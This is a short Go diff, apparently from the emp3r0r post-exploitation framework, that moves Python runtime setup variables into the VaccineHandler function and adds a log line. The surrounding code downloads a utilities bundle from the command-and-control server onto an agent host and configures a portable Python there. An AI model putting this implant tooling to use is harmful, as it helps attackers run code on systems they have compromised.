@@ -18,23 +18,23 @@ import (
 	"github.com/mholt/archiver"
 )
 
-var (
-	PythonArchive = RuntimeConfig.UtilsPath + "/python3.9.tar.xz"
-	PythonLib     = RuntimeConfig.UtilsPath + "/python3.9"
-	PythonPath    = fmt.Sprintf("%s:%s:%s", PythonLib, PythonLib+"/lib-dynload", PythonLib+"/site-packages")
-
-	// run python scripts with this command
-	// LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/home/u/alpine/lib PYTHONPATH="/tmp/python3.9:/tmp/python3.9/site-packages:/tmp/python3.9/lib-dynload" /tmp/python3
-	PythonCmd = fmt.Sprintf("PYTHONPATH=%s PYTHONHOME=%s "+
-		"LD_LIBRARY_PATH=%s:/usr/lib:/lib:/lib64:/usr/lib64:/usr/lib32 %s ",
-		PythonPath, PythonLib,
-		emp3r0r_data.LibPath, RuntimeConfig.UtilsPath+"/python3")
-
-	// run python itself with this script
-	PythonLauncher = fmt.Sprintf("#!%s\n%s"+`"$@"`+"\n", emp3r0r_data.DefaultShell, PythonCmd)
-)
-
 func VaccineHandler() (out string) {
+	var (
+		PythonArchive = RuntimeConfig.UtilsPath + "/python3.9.tar.xz"
+		PythonLib     = RuntimeConfig.UtilsPath + "/python3.9"
+		PythonPath    = fmt.Sprintf("%s:%s:%s", PythonLib, PythonLib+"/lib-dynload", PythonLib+"/site-packages")
+
+		// run python scripts with this command
+		// LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/home/u/alpine/lib PYTHONPATH="/tmp/python3.9:/tmp/python3.9/site-packages:/tmp/python3.9/lib-dynload" /tmp/python3
+		PythonCmd = fmt.Sprintf("PYTHONPATH=%s PYTHONHOME=%s "+
+			"LD_LIBRARY_PATH=%s:/usr/lib:/lib:/lib64:/usr/lib64:/usr/lib32 %s ",
+			PythonPath, PythonLib,
+			emp3r0r_data.LibPath, RuntimeConfig.UtilsPath+"/python3")
+
+		// run python itself with this script
+		PythonLauncher = fmt.Sprintf("#!%s\n%s"+`"$@"`+"\n", emp3r0r_data.DefaultShell, PythonCmd)
+	)
+
 	log.Printf("Downloading utils from %s", emp3r0r_data.CCAddress+"www/utils.tar.bz2")
 	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/utils.tar.bz2", RuntimeConfig.AgentRoot+"/utils.tar.bz2")
 	out = "[+] Utils have been successfully installed"
@@ -64,6 +64,7 @@ func VaccineHandler() (out string) {
 	}
 
 	// extract python3.9.tar.xz
+	log.Printf("%s, %s, %s", PythonArchive, PythonLib, PythonPath)
 	os.RemoveAll(PythonLib)
 	if util.IsFileExist(PythonArchive) {
 		log.Printf("Found python archive at %s, trying to configure", PythonArchive)
